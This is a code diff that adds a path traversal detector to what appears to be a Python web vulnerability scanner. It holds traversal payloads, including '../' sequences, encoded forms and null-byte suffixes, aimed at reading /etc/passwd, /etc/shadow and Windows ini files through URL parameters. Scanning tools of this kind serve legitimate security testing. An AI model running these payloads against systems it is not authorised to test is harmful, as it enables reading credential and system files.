@@ -714,3 +714,80 @@ class sqliscan(vulndetector):
 							self.detections.append(toappend)
 					return True
 		return False
+
+class path_traversal_scan(vulndetector):
+	def __init__(self,req,color=False):
+		self.name = 'path_traversal_scan'
+		self.color = color
+		self.req = req
+		self.cmsroot = None
+		self.toolflags = []
+		self.headers = []
+		self.filelist = ['']
+		self.wordpatterns = ['']
+		self.defaultdirs = ['']
+		self.defaultfiles = ['']
+		self.dicdefdirs = {}
+		self.toolpath = None
+		self.standalone = False
+		self.postcrawl = True
+		self.detections = []
+		self.toolargs = []
+		self.resources = []
+		self.output = None
+		# Puntuacion de este scanner
+		self.puntuation = 0	
+		self.standalone = True
+		self.cmsroot = None
+		# preffix file suffix
+		self.path_files = {'/etc/passwd':'root:x:0:0:root:/root:',
+			'/etc/passwd':'root:x:0:0:root:/root:',
+			'/etc/shadow':'root:$',
+			'/etc/bashrc':'# ~/.bashrc: executed by',
+			'/etc/cups/cupsd.conf':'# Configuration file for the CUPS scheduler',
+			'/etc/group':'root:x:0:',
+			'/etc/profile':'# /etc/profile: system-wide',
+			'/proc/cpuinfo':'processor	: 0',
+			'C:/Windows/system.ini':'; for 16-bit app support',
+			'C:/Windows/win.ini':'; for 16-bit app support'
+		}
+		self.preffixes = ['','../../../../../',
+			"..\\..\\..\\..\\..\\",
+			"..\/,..\/,..\/..\/,..\/",
+			"%2e%2e%2f%2e%2e%2f"
+		]
+		self.suffixes = ['','%00']
+		
+	def launchExploitFilename(self,dirurl):
+		if self.test_traversal(dirurl):
+			print "VULNERABLE TO PATH TRAVERSAL: ",dirurl
+	
+	def test_traversal(self,dirurl):
+		cve = 'Path traversal'
+		payload = "'"
+		try:
+			orig_resp = self.req.getHTMLCode(dirurl)
+		except Exception as e:
+			return False
+		if orig_resp is None or orig_resp.text is None: return
+		injection_points = parseurls.get_injection_points(dirurl)
+		if injection_points is None: return 
+		for injection_point in injection_points:
+			for key in self.path_files:
+				# we find those strings that don't appear on orig_resp
+				if self.path_files[key].lower() not in orig_resp.text.lower():
+					for pfx in self.preffixes:
+						for sufx in self.suffixes:
+							new_url = injection_point.replace('{TO_REPLACE}',"%s" % ('%s%s%s'% (pfx,key,sufx)))
+							try: new_resp = self.req.getHTMLCode(new_url)
+							except Exception as e: pass
+							if (new_resp is not None and 
+								new_resp.text is not None and
+								self.path_files[key].lower() in new_resp.text.lower()
+							):
+								print '*'*(len(cve)+15),'\nVulnerable to %s\n' % cve,'*'*(len(cve)+15)
+								toappend = "[ "+new_url+" ] ====== VULNERABLE TO: "+cve+" ====="
+								if toappend not in self.detections:
+									self.detections.append(toappend)
+									return True
+		return False
